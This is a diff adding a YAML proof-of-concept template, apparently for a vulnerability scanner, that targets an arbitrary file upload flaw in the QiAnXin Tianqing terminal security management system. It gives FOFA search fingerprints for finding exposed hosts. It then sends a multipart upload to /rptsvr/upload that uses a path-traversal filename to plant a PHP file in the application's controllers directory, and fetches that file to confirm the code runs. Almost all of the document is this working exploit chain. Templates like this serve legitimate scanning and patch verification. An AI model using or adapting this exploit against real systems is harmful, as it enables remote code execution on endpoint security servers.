@@ -1,0 +1,54 @@
+id: poc-yaml-qax-terminal-security-management-system-rptsvr-anyfile-upload
+info:
+  name: 奇安信天擎 rptsvr 任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 天擎终端安全管理系统
+  fofa: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6"
+    || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+variables:
+  t1: random_str(32)
+  filename: random_str(6)
+  boundary: random_str(29)
+requests:
+- method: POST
+  path: /rptsvr/upload
+  headers:
+    Content-Type: multipart/form-data;boundary=---------------------------{{.boundary}}
+  data: '-----------------------------{{.boundary}}
+
+    Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/{{.filename}}.php"
+
+    Content-Type: text/x-python
+
+
+    <?php
+
+    echo "{{.t1}}";
+
+    ?>
+
+    -----------------------------{{.boundary}}
+
+    Content-Disposition: form-data; name="token"
+
+
+    skylar_report
+
+    -----------------------------{{.boundary}}--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"{\"result\":\"success\", \"reason\": \"uploaded\"}")
+
+    '
+- method: GET
+  path: /application/api/controllers/{{.filename}}.php
+  expression: 'status_code == 200 &&
+
+    contains(body,t1)
+
+    '
+transport: http
